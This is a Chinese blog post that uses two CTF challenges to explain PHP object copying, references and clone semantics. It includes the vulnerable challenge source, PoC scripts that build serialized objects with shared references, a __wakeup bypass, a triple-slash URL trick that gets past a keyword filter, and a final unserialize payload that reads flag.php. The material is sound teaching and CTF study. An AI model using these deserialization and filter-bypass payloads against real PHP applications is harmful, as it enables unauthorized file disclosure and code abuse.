---
title: 从两道题目浅谈PHP深浅拷贝
date: 2020-03-18 17:35:21
tags:
    - php
categories:
    - web
keywords: 
    - PHP深浅拷贝
toc: true
---

## 0x01 前言
最近才认认真真看完PHP，虽然还是有很多地方不会应用，因此想多看看有关PHP的题目，看到了两道和PHP深浅拷贝有关的题目，自己也把它搞懂吧。。

## 0x01 正文
**题一**：南邮ctf的PHP反序列化

```php
<?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass);

    if ($o) {
        $o->secret = "*";
        if ($o->secret === $o->enter)
            echo "Congratulation! Here is my secret: ".$o->secret;
        else 
            echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";
}
?>
```
题目意图很简单，就是先设置了对象的一个属性的值，如果另一个属性的值和这个设置好的值相等，则得到flag，而`get_magic_quotes_gpc()`和`$pass=stripslashes($pass)`只是把加上的转义字符又给去掉，似乎对这个题没有什么影响。最初我以为`$o->secret = "*"`就是把这个属性的值设为`*`，其实是设置成了任意字符，那我们如何将这个满足`$o->secret === $o->enter`这里就要用到`PHP深浅拷贝`的知识。

我们举一个栗子：

```php
<?php
class Example1
{
    public $name;

    public function __construct($name)
    {
        $this->name = $name;
    }
}

$ex1 = new Example('test1');// $ex1->name现在是：test1
$ex2 = $ex1;// $ex2->name现在是：test1

$ex2->name = 'test2';// 这样修改一下之后，$ex1->name与$ex2->name都变为了：test2
```
现在我们应该可以理解`对象间引用`的概念，他们就相当于是同一个类的同一个对象，PHP5默认通过引用传递对象，假设\$obj1和\$obj2是两个对象，使用`$obj1=$obj2`这样的方法复制出的对象是相互关联的，程序中想复制一个值与原来相同的对象，而`不希望目标对象与源对象关联`，应使用`clone`关键字。

```php
$ex1 = new Example('test1');// $ex1->name现在是：test1
$ex2 = clone $ex1;//$ex2->name现在是：test1
$ex2->name = 'test2';//现在$ex1->name还是test1,而$ex2->name是test2
```
这里看到，通过clone之后，\$ex1与\$ex2是两个不同的对象，他们拥有各自的变量环境。但是这里需要注意，在这两个对象内部，`拥有的是值类型的数据`，如果是内部`拥有的是引用类型`，那么通过clone得到的`新对象中的引用则仍然指向原引用`

因此这里就引申出 **浅复制** 与 **深复制** 的概念：

>**浅复制**： 使用clone来复制对象，这种复制叫做“浅复制“，被赋值对象的所有变量都还有与原来对象相同的值，而所有的**对其他对象的引用都仍然指向原来的对象。** 
**深复制**：被复制的对象的所有的变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。

而如果要进行深复制，应该在类中定义一个`__clone()`方法,在这个方法中完成对目标对象的属性赋以新值，这里就不过多赘述。

或者`利用串行化(冷藏与解冻)`，即序列化再反序列化：

```php
$tmp = serialize($ex1);
$ex2 = unserialize($tmp);
```
这样得到的$ex2就是一个全新的对象

最后要引出`&`，属于浅拷贝，举个例子就能明白了：

```php
<?php
$a = 'crispr';
$b = &$a;
$b = 'crispr copy';
echo $a; //此时$a = 'crispr copy'
```
类似传地址过去，其实它们的改变是完全同步的，或者说它们就是一体的。

因此PHP生成的POC如下:

```php
<?php 
  class just4fun
  {
      var $enter;
      var $secret;
      
      function __construct()
      {
          $this->enter=&$this->secret; //浅拷贝，它们的变化完全同步
      }
   }
 echo serialize(new just4fun());
 
  ?>
```

**题二：** 2019全国信息安全大赛 JustSoSo
  这里我是本地进行复现的，23333，只能分析一下PHP了和构造Poc，其他的文件包含读PHP就省去了。。。

`hint.php`

```php
<?php  
class Handle{ 
    private $handle;  
    public function __wakeup(){
foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
public function __construct($handle) { 
        $this->handle = $handle; 
    } 
public function __destruct(){
$this->handle->getFlag();
}
}

class Flag{
    public $file;
    public $token;
    public $token_flag;

    function __construct($file){
$this->file = $file;
$this->token_flag = $this->token = md5(rand(1,10000));
    }

public function getFlag(){
$this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
{
if(isset($this->file)){
echo @highlight_file($this->file,true); 
            }  
        }
    }
}
?>
```
`index.php`

```php
<html>
<?php
error_reporting(0); 
$file = $_GET["file"]; 
$payload = $_GET["payload"];
if(!isset($file)){
echo 'Missing parameter'.'<br>';
}
if(preg_match("/flag/",$file)){
die('hack attacked!!!');
}
@include($file);
if(isset($payload)){  
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) { 
         die('stop hacking!');
         exit();
        }
    }
    $payload = unserialize($payload);
}else{ 
   echo "Missing parameters"; 
} 
?>
<!--Please test index.php?file=xxx.php -->
<!--Please get the source of hint.php-->

</html>
```
通过`GET`获取两个参数：`file`和`payload`。
Hint.php中有两个类`Flag`和`Handle`。主要是通过Handle来调用Flag的getFlag()函数。但在Handle中存在wakeup()函数，该函数会重置所有变量，导致传入的Flag类对象为空。这里可以利用`增加对象个数的方式`来绕过wakeup函数，增加对象个数时wakeup函数便会失效，这个是比较常见的。还要绕过一层：

```php
 function __construct($file){
$this->file = $file;
$this->token_flag = $this->token = md5(rand(1,10000));
    }

public function getFlag(){
$this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
{
if(isset($this->file)){
echo @highlight_file($this->file,true); 
            }  
```
这里我们的`$file`是`flag.php`，而初始化后，`$this->token_flag = $this->token`，接着调用getFlag()方法后，重新设置了`$this->token_flag`，因此在这里也应该是要使用`&`符号，令`$this->token_flag = &$this->token`进行浅拷贝。

```php
if(isset($payload)){  
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) { 
         die('stop hacking!');
         exit();
```
此时还需要绕过`?payload=`不能出现flag,但是flag在`flag.php`中，在url多加斜杠即可,`///index.php?`此时PHP便不会解析成功了。
最终PHP的Poc如下:

```php
<?php
class Handle{ 
    private $handle;  
    public function __wakeup(){
foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
public function __construct($handle) { 
        $this->handle = $handle; 
    } 
public function __destruct(){
	$this->handle->getFlag();
}
}
class Flag{
	public $file;
    public $token;
    public $token_flag;

    function __construct($file){
$this->file = $file;
$this->token_flag = &$this->token;
}
}
	
$o = new Flag('flag.php');
$oo = new Handle($o);
$ser = serialize($oo);

print $ser;
?>
```
最终payload:
`///index.php?file=hint.php&payload=O:6:"Handle":2:{s:14:"%00Handle%00handle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";N;s:10:"token_flag";R:4;}}`

注意Handle有私有变量，应该加上`%00`
